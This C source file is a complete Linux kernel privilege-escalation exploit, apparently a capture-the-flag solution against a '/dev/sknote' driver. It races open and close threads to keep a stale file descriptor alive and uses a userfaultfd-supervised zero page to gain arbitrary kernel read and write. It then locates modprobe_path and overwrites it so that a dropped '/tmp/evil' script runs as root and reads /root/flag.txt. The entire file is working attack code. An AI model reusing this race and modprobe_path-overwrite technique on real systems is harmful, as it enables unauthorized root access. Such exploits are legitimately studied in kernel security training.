#include "exploit.h"

// commands
#define DEV_PATH "/dev/sknote" // the path the device is placed
#define MAX_NOTE_SIZE 0x400

/*********   MAIN  REGION  ******************/

typedef struct {
  ssize_t length;
  char *data;
} note_t;

typedef struct {
  unsigned long refcnt;
  note_t *noteptr;
} shared_note;

// globals
note_t *fake_note;
#define REPEAT 0x100
int SHOULDEND = 0;
int fds[REPEAT] = {999999};
int vicfd = -1; // alive fd
char *EMPTYNOTE;
// (END globals)

// main

static void *closer(void *arg) {
  puts("[+] closer starting");
  while(SHOULDEND == 0) {
    for (int ix = 0; (ix != REPEAT) && (SHOULDEND == 0); ++ix) {
      close(fds[ix]);
    }
    usleep(1);
  }
  puts("[+] closer exiting");
  return NULL;
}

static void *opener(void *arg) {
  puts("[+] opener starting");
  while(SHOULDEND == 0) {
    for (int ix = 0; (ix != REPEAT) && (SHOULDEND == 0); ++ix) {
      assert((fds[ix] = open(DEV_PATH, O_RDWR)) >= 0);
    }
    usleep(1);
  }
  puts("[+] opener exiting");
}

static void checker(ulong fault_addr) {
  SHOULDEND = 1;
}

char* readmem(void *addr, ulong size) {
  assert(vicfd != -1);
  assert(lseek(vicfd, 0, SEEK_SET) != -1);
  char *buf = calloc(size, 1);
  assert(buf != 0);

  note_t *fake = (note_t*)0;
  fake->length = size + 0x10;
  fake->data = addr;

  if(read(vicfd, buf, size) != -1) {
    return buf;
  } else {
    return NULL;
  }
}

void writemem(void *addr, char *buf, ulong size) {
  assert(vicfd != -1);
  assert(lseek(vicfd, 0, SEEK_SET) != -1);

  note_t *fake = (note_t*)0;
  fake->length = size + PAGE;
  fake->data = addr;

  assert(write(vicfd, buf, size) != -1);
}

void prepare_nirugiri(void) {
  system("echo -ne '\\xff\\xff\\xff\\xff' > /tmp/nirugiri");
  system("echo -ne '#!/bin/sh\nchmod 777 /root/flag.txt && cat /root/flag.txt' > /tmp/evil");
  system("chmod +x /tmp/evil");
  system("chmod +x /tmp/nirugiri");
}

int main(int argc, char *argv[])
{
  prepare_nirugiri();
  pthread_t opener_thr, closer_thr;
  assert((EMPTYNOTE = mmap((void*)0x2525000, PAGE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0)) != MAP_FAILED);
  memset(EMPTYNOTE, 0, PAGE);

  // map at addr 0 and supervize it.
  struct skb_uffder *zero_visor = new_skb_uffder(0UL, 1, EMPTYNOTE, checker, "zeropage");
  skb_uffd_start(zero_visor, NULL);
  sleep(1);

  // repeat open and close to invoke race
  puts("[+] starting opener and closer...");
  assert(pthread_create(&closer_thr, NULL, closer, (void *)0) == 0);
  assert(pthread_create(&opener_thr, NULL, opener, (void *)0) == 0);
  pthread_join(opener_thr, NULL);
  pthread_join(closer_thr, NULL);

  // check which fd is still alive
  note_t *fake = (note_t*)0;
  fake->length = 0x10;
  fake->data = "hogehoge";
  puts("[.] checking race is actually achieved...");
  for (int ix = 0; vicfd == -1 && ix != REPEAT; ++ix) {
    char buf[0x10] = {0};
    switch(read(fds[ix], buf, 0xF)) {
      case -1:
        continue;
      default:
        if (strncmp(buf, "hogehoge", 8) == 0) {
          vicfd = ix;
          printf("[!] found alive fd: %d\n", vicfd);
        }
    }
  }
  fflush(stdout);
  if (vicfd == -1) {
    puts("[-] not found alive fd...");
  }

  /**** now, AAW/AAR is achieved ****/

  // search modprobe_path
  const ulong text_base = 0xffffffff81000000; // w/o kaslr
  const ulong search_lim = 0xffffffffFFFFFFFF - (2 * PAGE);
  const char *target_string = "/sbin/modprobe";
  const ulong modprobe_path_offset = 0x7c0;
  ulong modprobe_path = 0;
  for (ulong cur = text_base; cur <= search_lim; cur += PAGE) {
    if (cur % (PAGE * 0x1000) == 0) {
      printf("[.] searching for modprobe_path: %lx\n", cur);
    }
    char *buf = readmem(cur + modprobe_path_offset, 0x20);
    if (buf == NULL)
      continue;
    if (strncmp(buf, target_string, strlen(target_string)) == 0) {
      modprobe_path = cur + modprobe_path_offset;
      printf("[!] found modprobe_path @ 0x%lx\n", modprobe_path);
      break;
    }
  }

  // overwrite modprobe_path
  if (modprobe_path == 0) {
    errExit("modprobe_path not found.");
  }
  writemem(modprobe_path, "/tmp/evil\x00", 0x10);

  // invoke nirugiri
  system("/tmp/nirugiri");
  system("cat /root/flag.txt");

  // end of life
  puts("[ ] END exploit.");
  fflush(stdout);
  //puts("WAITING...");
  //sleep(9999);
}
